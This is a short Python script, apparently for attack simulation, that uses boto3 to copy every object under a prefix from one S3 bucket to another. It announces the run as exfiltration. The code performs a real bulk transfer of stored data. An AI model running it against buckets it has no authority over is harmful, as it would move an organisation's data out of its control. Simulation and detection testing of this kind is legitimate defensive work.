import boto3

def simulate_s3_exfiltrate(source_bucket, dest_bucket, prefix=""):
    s3 = boto3.resource("s3")

    print(f"[+] EXFILTRATING data from {source_bucket} → {dest_bucket}")

    src = s3.Bucket(source_bucket)
    dest = s3.Bucket(dest_bucket)

    for obj in src.objects.filter(Prefix=prefix):
        copy_source = {
            "Bucket": source_bucket,
            "Key": obj.key
        }
        dest.copy(copy_source, obj.key)
        print(f"[+] Copied: {obj.key}")

    print("[✓] Exfiltration Complete!")
